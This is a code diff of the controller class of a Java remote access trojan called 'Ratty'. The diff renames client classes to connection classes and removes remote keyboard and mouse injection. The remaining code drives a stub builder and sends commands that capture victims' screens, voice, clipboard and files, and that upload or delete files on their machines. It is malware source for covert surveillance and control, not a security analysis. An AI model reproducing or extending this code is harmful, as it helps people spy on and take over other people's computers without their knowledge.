@@ -10,8 +10,8 @@ import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.fx.ISoundListener;
 import de.sogomn.engine.fx.Sound;
-import de.sogomn.rat.ActiveClient;
-import de.sogomn.rat.IClientObserver;
+import de.sogomn.rat.ActiveConnection;
+import de.sogomn.rat.IConnectionObserver;
 import de.sogomn.rat.builder.StubBuilder;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
@@ -25,8 +25,6 @@ import de.sogomn.rat.packet.FileSystemPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
-import de.sogomn.rat.packet.KeyEventPacket;
-import de.sogomn.rat.packet.MouseEventPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.packet.UploadFilePacket;
@@ -40,7 +38,7 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
  * THIS CLASS IS A MESS!
  * I HAVE NO IDEA HOW ONE MAKES NON-MESSY CONTROLLER CLASSES
  */
-public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
+public final class RattyGuiController implements IServerObserver, IConnectionObserver, IGuiController {
 	
 	private RattyGui gui;
 	private JFileChooser fileChooser;
@@ -60,9 +58,9 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		gui.setController(this);
 	}
 	
-	private ServerClient getServerClient(final ActiveClient client) {
+	private ServerClient getServerClient(final ActiveConnection client) {
 		for (final ServerClient serverClient : clients) {
-			if (serverClient.client == client) {
+			if (serverClient.connection == client) {
 				return serverClient;
 			}
 		}
@@ -153,30 +151,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final String path = treePanel.getLastPathClicked();
 			
 			packet = new DeleteFilePacket(path);
-		} else if (command == DisplayPanel.KEY_PRESSED && serverClient.isStreamingDesktop()) {
-			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
-			final int key = displayPanel.getLastKeyHit();
-			
-			packet = new KeyEventPacket(key, KeyEventPacket.PRESS);
-		} else if (command == DisplayPanel.KEY_RELEASED && serverClient.isStreamingDesktop()) {
-			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
-			final int key = displayPanel.getLastKeyHit();
-			
-			packet = new KeyEventPacket(key, KeyEventPacket.RELEASE);
-		} else if (command == DisplayPanel.MOUSE_PRESSED && serverClient.isStreamingDesktop()) {
-			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
-			final int x = displayPanel.getLastXPos();
-			final int y = displayPanel.getLastYPos();
-			final int button = displayPanel.getLastButtonHit();
-			
-			packet = new MouseEventPacket(x, y, button, MouseEventPacket.PRESS);
-		} else if (command == DisplayPanel.MOUSE_RELEASED && serverClient.isStreamingDesktop()) {
-			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
-			final int x = displayPanel.getLastXPos();
-			final int y = displayPanel.getLastYPos();
-			final int button = displayPanel.getLastButtonHit();
-			
-			packet = new MouseEventPacket(x, y, button, MouseEventPacket.RELEASE);
 		} else if (command == RattyGui.VOICE && !serverClient.isStreamingVoice()) {
 			packet = new VoicePacket();
 		} else if (command == RattyGui.WEBSITE) {
@@ -207,11 +181,11 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		final int screenWidth = packet.getScreenWidth();
 		final int screenHeight = packet.getScreenHeight();
 		final DesktopStreamPacket request = new DesktopStreamPacket();
-		final DisplayPanel displayPanel = serverClient.getDisplayPanel();
+		final DisplayController displayPanel = serverClient.getDisplayPanel();
 		
 		displayPanel.showFrames(frames, screenWidth, screenHeight);
 		
-		serverClient.client.addPacket(request);
+		serverClient.connection.addPacket(request);
 	}
 	
 	private void handle(final ServerClient serverClient, final VoicePacket packet) {
@@ -227,7 +201,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			public void stopped(final Sound source) {
 				final VoicePacket voice = new VoicePacket();
 				
-				serverClient.client.addPacket(voice);
+				serverClient.connection.addPacket(voice);
 			}
 		});
 		sound.play();
@@ -254,7 +228,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	@Override
-	public void packetReceived(final ActiveClient client, final IPacket packet) {
+	public void packetReceived(final ActiveConnection client, final IPacket packet) {
 		final ServerClient serverClient = getServerClient(client);
 		final boolean loggedIn = serverClient.isLoggedIn();
 		
@@ -294,7 +268,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	@Override
-	public void clientDisconnected(final ActiveClient client) {
+	public void disconnected(final ActiveConnection client) {
 		final ServerClient serverClient = getServerClient(client);
 		final FileTreePanel treePanel = serverClient.getTreePanel();
 		
@@ -311,7 +285,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	@Override
-	public synchronized void clientConnected(final ActiveServer server, final ActiveClient client) {
+	public synchronized void connected(final ActiveServer server, final ActiveConnection client) {
 		final ServerClient serverClient = new ServerClient(client);
 		final InformationPacket packet = new InformationPacket();
 		
@@ -332,7 +306,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		final IPacket packet = getPacket(command, serverClient);
 		
 		if (packet != null) {
-			serverClient.client.addPacket(packet);
+			serverClient.connection.addPacket(packet);
 		}
 		
 		if (command == RattyGui.DESKTOP) {
